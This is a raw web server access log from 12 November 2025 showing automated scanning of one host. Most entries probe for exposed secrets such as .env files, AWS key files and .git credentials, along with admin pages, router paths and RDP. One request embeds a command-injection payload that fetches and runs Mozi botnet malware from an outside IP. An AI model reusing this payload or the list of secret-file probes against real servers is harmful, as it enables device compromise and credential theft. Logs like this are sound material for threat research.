78.153.140.151 - - [12/Nov/2025:09:06:43 +0800] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
78.153.140.151 - - [12/Nov/2025:09:06:43 +0800] "GET /.env-container.log HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.0.4; pt-br; GT-S7562L Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [12/Nov/2025:09:06:44 +0800] "GET /.env-session-store HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.15) Gecko/20101027 Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10"
78.153.140.151 - - [12/Nov/2025:09:06:44 +0800] "GET /.env-auth-settings HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"
78.153.140.151 - - [12/Nov/2025:09:06:45 +0800] "GET /.env-deploy-config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
78.153.140.151 - - [12/Nov/2025:09:06:46 +0800] "GET /.env-workflow.json HTTP/1.1" 404 153 "-" "Opera/9.30 (Nintendo Wii; U; ; 2071; Wii Shop Channel/1.0; en)"
78.153.140.151 - - [12/Nov/2025:09:06:47 +0800] "GET /.env-interface.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009040820 Firefox/3.0.9"
78.153.140.151 - - [12/Nov/2025:09:06:47 +0800] "GET /.env.mail_settings HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0"
78.153.140.151 - - [12/Nov/2025:09:06:48 +0800] "GET /.env.testing.local HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.32 (KHTML, like Gecko) Version/8.1 Safari/601.1.32"
78.153.140.151 - - [12/Nov/2025:09:06:48 +0800] "GET /.env-bitbucket.log HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:16.0) Gecko/20100101 Firefox/16.0"
78.153.140.151 - - [12/Nov/2025:09:06:49 +0800] "GET /.env.staging.local HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0"
78.153.140.151 - - [12/Nov/2025:09:06:49 +0800] "GET /.env-alerting.conf HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/417.9 (KHTML, like Gecko)"
78.153.140.151 - - [12/Nov/2025:09:06:50 +0800] "GET /.env-passwords.bak HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F5089a Safari/602.1"
78.153.140.151 - - [12/Nov/2025:09:06:50 +0800] "GET /.env-variables.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9.2.1 like Mac OS X; en_US) AppleWebKit/1 (KHTML, like Gecko) Mobile/1 Safari/1 iPhone/1 EtsyInc/4.34 rv:43400.94.0"
78.153.140.151 - - [12/Nov/2025:09:06:51 +0800] "GET /.env-backup.tar.gz HTTP/1.1" 404 153 "-" "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-N900V Build/LRX21V)"
78.153.140.151 - - [12/Nov/2025:09:06:52 +0800] "GET /.env-config.backup HTTP/1.1" 404 153 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]"
78.153.140.151 - - [12/Nov/2025:09:06:53 +0800] "GET /.env-smtp-settings HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 OPR/45.0.2552.635"
78.153.140.151 - - [12/Nov/2025:09:06:53 +0800] "GET /.env-pipeline.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFOT Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [12/Nov/2025:09:06:54 +0800] "GET /.env-postgres.conf HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.113 Safari/534.30"
78.153.140.151 - - [12/Nov/2025:09:06:54 +0800] "GET /.env.smtp_settings HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.168 Safari/537.36 OPR/51.0.2830.40"
78.153.140.151 - - [12/Nov/2025:09:06:55 +0800] "GET /.env-documentation HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; uk; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"
78.153.140.151 - - [12/Nov/2025:09:06:56 +0800] "GET /.aws/keys_sns.conf HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11"
78.153.140.151 - - [12/Nov/2025:09:06:56 +0800] "GET /.aws/keys_ses.conf HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.3; en-gb; SonyC1905 Build/15.4.A.1.9) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [12/Nov/2025:09:06:57 +0800] "GET /.aws/api-keys.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
78.153.140.151 - - [12/Nov/2025:09:06:58 +0800] "GET /.aws/.secrets.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"
78.153.140.151 - - [12/Nov/2025:09:06:59 +0800] "GET /aws-keys/local.yml HTTP/1.1" 404 153 "-" "Opera/9.80 (X11; Linux i686; Edition Linux Mint) Presto/2.12.388 Version/12.16"
78.153.140.151 - - [12/Nov/2025:09:06:59 +0800] "GET /aws-credentials.sh HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3"
78.153.140.151 - - [12/Nov/2025:09:07:00 +0800] "GET /aws-configura.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; A210 Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
78.153.140.151 - - [12/Nov/2025:09:07:00 +0800] "GET /app/konfig/aws.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10"
78.153.140.151 - - [12/Nov/2025:09:07:01 +0800] "GET /app/config/aws.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36"
78.153.140.151 - - [12/Nov/2025:09:07:01 +0800] "GET /api/konfig/aws.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; GT-S7582 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
192.159.99.101 - - [12/Nov/2025:09:10:35 +0800] "GET / HTTP/1.0" 200 3958 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
93.174.93.12 - - [12/Nov/2025:09:14:13 +0800] "GET / HTTP/1.0" 200 3958 "-" "Mozilla/5.0 (X11; CrOS x86_64 11647.154.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.114 Safari/537.36"
27.148.196.43 - - [12/Nov/2025:09:15:02 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0"
45.135.232.237 - - [12/Nov/2025:09:17:42 +0800] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1"
200.6.48.19 - - [12/Nov/2025:09:20:52 +0800] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1"
198.235.24.248 - - [12/Nov/2025:09:23:30 +0800] "GET / HTTP/1.0" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
204.76.203.212 - - [12/Nov/2025:09:28:32 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [12/Nov/2025:09:32:04 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.3 - - [12/Nov/2025:09:38:05 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
205.210.31.25 - - [12/Nov/2025:09:48:21 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x99\xC1)\x96\xDC\xC2\xF0\xDCv;{\x8An~\x1C\x223p\x06\x04Qs\xCDL>\x00\x19t\x1A\xB5\x8A\x1A ^\xDE|\xB2N\xAD\xA4{w:\x12\x00o\x04\xB1\xCD/\xE9\xAD<\x1B\x17\x91\xF9\x22+'-4I\x0B\x89\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
205.210.31.25 - - [12/Nov/2025:09:48:21 +0800] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03c\xDA\x1B\xC0\xA1\x96\xF5\x06\xE9\xC8\xA9\xBC\xAA5O\xA4\xBE~\x8C\x0Em\xD5\xC79\x1D\x93\xF9\x03\x9C\xB1\x81\xA6\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
117.251.140.106 - - [12/Nov/2025:09:53:06 +0800] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://117.251.140.106:43166/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 153 "-" "Hello, world"
195.178.110.152 - - [12/Nov/2025:09:58:19 +0800] "GET /favicon.ico HTTP/1.1" 404 153 "-" "ip9max/1.0"
195.178.110.152 - - [12/Nov/2025:09:58:19 +0800] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
195.178.110.152 - - [12/Nov/2025:09:58:19 +0800] "GET /.well-known/assetlinks.json HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:19 +0800] "GET /robots.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /.well-known/openid-configuration HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /.well-known/webfinger HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /.well-known/apple-app-site-association HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /sitemap_index.xml HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /crossdomain.xml HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /manifest.json HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /.well-known/host-meta.json HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /app-ads.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /clientaccesspolicy.xml HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /ads.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /.well-known/host-meta HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /browserconfig.xml HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /.well-known/nodeinfo HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "GET /sitemap.xml HTTP/1.1" 404 153 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "HEAD /.well-known/security.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "HEAD /security.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0"
195.178.110.152 - - [12/Nov/2025:09:58:20 +0800] "OPTIONS / HTTP/1.1" 405 157 "-" "Go-http-client/1.1"
204.76.203.219 - - [12/Nov/2025:10:02:55 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
103.252.89.75 - - [12/Nov/2025:10:13:35 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
167.94.146.48 - - [12/Nov/2025:10:20:53 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.48 - - [12/Nov/2025:10:20:54 +0800] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.146.48 - - [12/Nov/2025:10:20:54 +0800] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.48 - - [12/Nov/2025:10:20:57 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03I^" 400 157 "-" "-"
167.94.146.48 - - [12/Nov/2025:10:20:58 +0800] "GET /login HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.48 - - [12/Nov/2025:10:21:03 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x1DZ\xC9\xD6-\xF9,4(\xF7uB\x99N\xBD\x0F\xA4\xA8\x86\xFE\x04\xA6\x18;\x22\xB9 \x15\xD7\xD4X\xBC \x8F0\xE6ic\x8A\xB4\xF4_9\xD7\xBE+4w\x8D\xA7nf\xC8\xD6\x84\xF2\x9F\xDBp$\xA4\xFEE\xCD\x94\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
193.142.147.209 - - [12/Nov/2025:10:28:16 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
204.76.203.219 - - [12/Nov/2025:10:29:35 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
124.198.132.121 - - [12/Nov/2025:10:38:35 +0800] "GET / HTTP/1.0" 200 3958 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
91.232.238.112 - - [12/Nov/2025:10:38:50 +0800] "GET / HTTP/1.0" 200 3958 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
202.79.161.74 - - [12/Nov/2025:10:50:36 +0800] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
204.76.203.219 - - [12/Nov/2025:10:58:43 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.74.182.142 - - [12/Nov/2025:11:17:00 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
93.174.93.12 - - [12/Nov/2025:11:20:46 +0800] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
204.76.203.219 - - [12/Nov/2025:11:29:00 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
162.216.149.6 - - [12/Nov/2025:11:29:39 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
152.42.131.18 - - [12/Nov/2025:11:35:13 +0800] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xDF\x97vi\x9E\x8D.\xA0zX\x82\x01\xFA\x13!\xFD\xFD\x1C\xE4\xE9\x22\x0C\xEB\xF8t\xC5\xE6!\x8A1D" 400 157 "-" "-"
152.42.131.18 - - [12/Nov/2025:11:35:13 +0800] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03H\x10\xEB\xAC\xD1\xDA\x17\xEB`\xA3\xFB\xA3\x9D\xD3\xCF\x9A\xED\xC4\x90\xADe#'\xF7\xD6'\xF7\xE5zF\xF22\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
152.42.131.18 - - [12/Nov/2025:11:35:13 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.131.18 - - [12/Nov/2025:11:35:14 +0800] "GET /form.html HTTP/1.1" 404 153 "-" "curl/8.1.2"
152.42.131.18 - - [12/Nov/2025:11:35:15 +0800] "GET /upl.php HTTP/1.1" 404 153 "-" "Mozilla/5.0"
152.42.131.18 - - [12/Nov/2025:11:35:15 +0800] "GET /t4 HTTP/1.1" 404 153 "-" "Mozilla/5.0"
152.42.131.18 - - [12/Nov/2025:11:35:15 +0800] "GET /geoip/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.131.18 - - [12/Nov/2025:11:35:16 +0800] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.131.18 - - [12/Nov/2025:11:35:17 +0800] "GET /1.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.131.18 - - [12/Nov/2025:11:35:17 +0800] "GET /systembc/password.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.131.18 - - [12/Nov/2025:11:35:17 +0800] "GET /password.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
213.209.157.24 - - [12/Nov/2025:11:43:53 +0800] "GET /.git/credentials HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.59"
192.159.99.180 - - [12/Nov/2025:11:44:15 +0800] "GET / HTTP/1.0" 200 3958 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
204.76.203.219 - - [12/Nov/2025:11:58:12 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.242.226.113 - - [12/Nov/2025:12:01:36 +0800] "\x16\x03\x01\x00\x8C\x01\x00\x00\x88\x03\x03\x9F? \xDE\x8C\xE4\xE3J\x10I\x9E\xC4m\xBEEx" 400 157 "-" "-"
192.159.99.101 - - [12/Nov/2025:12:28:08 +0800] "GET / HTTP/1.0" 200 3958 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
204.76.203.219 - - [12/Nov/2025:12:28:57 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.147.209 - - [12/Nov/2025:12:36:37 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
204.76.203.219 - - [12/Nov/2025:12:57:10 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.8.125 - - [12/Nov/2025:13:12:01 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello World"
79.124.59.86 - - [12/Nov/2025:13:17:19 +0800] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
66.240.205.34 - - [12/Nov/2025:13:26:09 +0800] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 157 "-" "-"
204.76.203.219 - - [12/Nov/2025:13:27:13 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [12/Nov/2025:13:57:39 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
79.124.59.86 - - [12/Nov/2025:14:21:28 +0800] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
204.76.203.30 - - [12/Nov/2025:14:22:48 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Opera/9.22 (X11; Linux i686; U; en)"
204.76.203.30 - - [12/Nov/2025:14:22:49 +0800] "GET /.env-critical.log HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0"
204.76.203.30 - - [12/Nov/2025:14:22:49 +0800] "GET /.env-test-results HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Z983 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36"
45.135.232.237 - - [12/Nov/2025:14:26:40 +0800] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1"
204.76.203.219 - - [12/Nov/2025:14:28:27 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.147.209 - - [12/Nov/2025:14:52:46 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
188.166.247.31 - - [12/Nov/2025:14:55:13 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
188.166.247.31 - - [12/Nov/2025:14:55:14 +0800] "GET /.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
198.235.24.17 - - [12/Nov/2025:14:56:49 +0800] "GET / HTTP/1.0" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
204.76.203.219 - - [12/Nov/2025:14:58:16 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
85.204.221.91 - - [12/Nov/2025:15:04:13 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
209.38.201.154 - - [12/Nov/2025:15:22:33 +0800] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
204.76.203.219 - - [12/Nov/2025:15:24:59 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [12/Nov/2025:15:55:38 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.191.92 - - [12/Nov/2025:16:00:24 +0800] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country= HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
45.140.17.52 - - [12/Nov/2025:16:03:04 +0800] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
34.79.200.193 - - [12/Nov/2025:16:07:16 +0800] "GET / HTTP/1.1" 200 3958 "-" "python-requests/2.32.5"
43.139.65.242 - - [12/Nov/2025:16:08:25 +0800] "GET /containers/json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.65.242 - - [12/Nov/2025:16:08:25 +0800] "GET /.env.bak HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
